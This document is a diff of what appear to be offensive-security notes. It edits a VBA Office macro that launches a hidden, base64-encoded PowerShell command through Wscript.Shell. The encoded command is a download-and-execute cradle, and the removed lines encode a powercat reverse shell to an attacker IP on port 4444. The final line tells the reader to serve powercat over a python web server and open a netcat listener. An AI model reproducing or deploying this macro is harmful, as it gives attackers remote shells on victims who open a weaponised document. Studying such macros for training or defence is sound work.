@@ -34,13 +34,11 @@ Sub MyMacro()
     Str = Str + "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU"
         Str = Str + "AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAd"
         Str = Str + "AAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwB"
-    ...
-        Str = Str + "QBjACAAMQA5ADIALgAxADYAOAAuADEAMQA4AC4AMgAgAC0AcAA"
-        Str = Str + "gADQANAA0ADQAIAAtAGUAIABwAG8AdwBlAHIAcwBoAGUAbABsA"
-        Str = Str + "A== "
+    
+    --snipp--
 
     CreateObject("Wscript.Shell").Run Str
 End Sub
 ```
 
-Don't forget to powercat server via a python web server and to open a netcat listener
+Don't forget to serve powercat via a python web server and to open a netcat listener
